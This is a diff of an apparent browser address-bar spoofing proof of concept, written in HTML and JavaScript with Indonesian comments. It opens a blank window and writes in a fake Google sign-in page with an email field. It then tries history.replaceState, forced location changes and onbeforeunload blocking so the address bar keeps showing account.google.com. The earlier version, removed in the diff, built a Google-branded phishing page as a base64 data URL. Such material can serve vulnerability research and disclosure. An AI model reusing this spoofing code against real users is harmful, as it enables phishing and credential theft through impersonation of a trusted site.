@@ -1,39 +1,55 @@
+<html>
+<head>
 <script>
 function f() {
-    // Gunakan data URL dengan origin yang disamarkan
-    const fakePage = `
+    w = window.open("about:blank", "_blank");
+    
+    // Tulis fake content dulu
+    w.document.write(`
         <html>
-        <head>
-            <title>Google Account</title>
-            <link rel="icon" href="https://www.google.com/favicon.ico">
-        </head>
-        <body style="font-family: Arial, sans-serif; margin: 0;">
-            <div style="background: #fff; border-bottom: 1px solid #dadce0; padding: 16px;">
-                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" height="32">
-            </div>
-            <div style="padding: 40px; max-width: 450px; margin: 0 auto;">
-                <h2 style="color: #202124;">Sign in</h2>
-                <p style="color: #5f6368;">This looks like Google but it's fake</p>
-                <input type="email" placeholder="Email or phone" style="width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; margin: 10px 0;">
-                <button style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer;">Next</button>
+        <head><title>Google Account</title></head>
+        <body>
+            <div style="font-family: Arial, sans-serif; padding: 20px;">
+                <h1>Fake Google Login</h1>
+                <p>Address bar shows account.google.com but content is fake!</p>
+                <input type="email" placeholder="Email or phone">
+                <button>Next</button>
             </div>
             <script>
-                // Lock the address bar - prevent navigation
-                window.addEventListener('beforeunload', function(e) {
-                    e.preventDefault();
-                    e.returnValue = '';
-                    return '';
-                });
+                // Coba redirect tapi FAIL/BLOCKED
+                try {
+                    // Method 1: Redirect ke URL yang invalid
+                    window.location = "https://account.google.com#blocked-by-poc";
+                    
+                    // Method 2: Redirect yang diblock oleh CSP
+                    window.location.replace("javascript:alert('redirect blocked')");
+                    
+                    // Method 3: Manipulasi history untuk spoof URL
+                    history.replaceState(null, "Google Account", "https://account.google.com");
+                    
+                } catch(e) {
+                    // Redirect gagal, tetap di halaman fake
+                    console.log("Redirect failed as expected");
+                }
                 
-                // Replace state to maintain fake URL
-                history.replaceState(null, '', 'https://accounts.google.com');
+                // Block further redirect attempts
+                window.onbeforeunload = function() { 
+                    return "Redirect blocked by POC"; 
+                };
             <\/script>
         </body>
         </html>
-    `;
-    
-    // Encode ke data URL
-    const dataUrl = 'data:text/html;base64,' + btoa(fakePage);
-    w = window.open(dataUrl, '_blank', 'width=800,height=600');
+    `);
+    w.document.close();
 }
 </script>
+</head>
+<body>
+<center>
+    <a href="#" onclick="f()" style="padding: 10px 20px; background: #4285f4; color: white; text-decoration: none; border-radius: 4px;">
+        Click For POC (Failed Redirect)
+    </a>
+    <p><small>Redirect akan gagal, address bar tetap spoofed</small></p>
+</center>
+</body>
+</html>
